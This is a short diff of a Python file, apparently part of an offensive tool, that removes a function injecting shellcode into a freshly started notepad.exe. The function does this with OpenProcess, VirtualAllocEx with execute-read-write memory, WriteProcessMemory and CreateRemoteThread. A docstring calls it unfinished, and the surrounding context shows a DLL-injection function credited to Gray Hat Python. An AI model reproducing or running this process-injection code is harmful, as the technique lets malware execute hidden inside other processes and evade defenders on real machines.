@@ -17,43 +17,6 @@ def get_pid(process_name):
             return proc.pid
 
 
-def proc_inject(shellcode, sacrificial_process='notepad.exe'):
-    '''
-    Section still work in progress, does not currently work
-    '''
-    notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
-    pid = get_pid(sacrificial_process)
-    PAGE_EXECUTE_READWRITE = 0x00000040
-    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
-    VIRTUAL_MEM = (0x1000 | 0x2000)
-    kernel32 = windll.kernel32
-    pid_to_kill = pid
-    padding = 4 - (len(pid))
-    replace_value = pid + ("\x00" * padding)
-    replace_string = "\x41" * 4
-    shellcode = shellcode.replace(replace_string, replace_value)
-    code_size = len(shellcode)
-    # Get a handle to the process we are injecting into.
-    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
-    if not h_process:
-        return f"[*] Couldn't acquire a handle to PID: {pid}"
-    # Allocate some space for the shellcode
-    arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size,
-                                          VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
-    # Write out the shellcode
-    written = c_int(0)
-    kernel32.WriteProcessMemory(h_process, arg_address, shellcode,
-                                code_size, byref(written))
-    # Now we create the remote thread and point its entry routine
-    # to be head of our shellcode
-    thread_id = c_ulong(0)
-    if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None,
-                                       0, byref(thread_id)):
-        return "[*] Failed to inject process-killing shellcode. Exiting."
-    else:
-        return "[*] Process injected successfully."
-
-
 def dll_inject(dll_path, sacrificial_process='notepad.exe'):
     """
     Taken from grayhat Python
